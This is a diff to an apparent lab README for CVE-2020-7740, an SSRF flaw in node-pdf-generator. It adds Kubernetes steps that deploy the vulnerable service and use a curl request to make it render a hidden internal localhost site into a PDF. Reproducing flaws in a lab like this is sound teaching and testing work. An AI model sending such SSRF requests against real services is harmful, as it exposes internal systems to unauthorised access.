@@ -35,3 +35,13 @@ This affects all versions of package [`node-pdf-generator`](https://github.com/d
 1. [Vicarius.io](https://www.vicarius.io/research-center/vulnerability/cve-2020-7740-id264841)
 2. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-7740)
 3. [Original Repository](https://github.com/darrenhaken/node-pdf-generator)
+
+
+## K8s section
+
+1. Build the container with `docker build --platform linux/amd64 -t cve-2020-7740 .`
+2. Build the container with `docker build --platform linux/amd64 -t hidden -f Dockerfile.hidden .`
+3. Create the pod `kubectl apply -f CVE-2020-7740-pod.yaml`
+4. Notice that we cannot visit [`localhost:3001`](http://localhost:3001) directly
+5. Send the request with curl using `curl --location --request GET localhost:3000/test --data-raw http://localhost:3001 --output test.pdf`
+6. View `test.pdf` to view the localhost website that is supposed to be hidden.
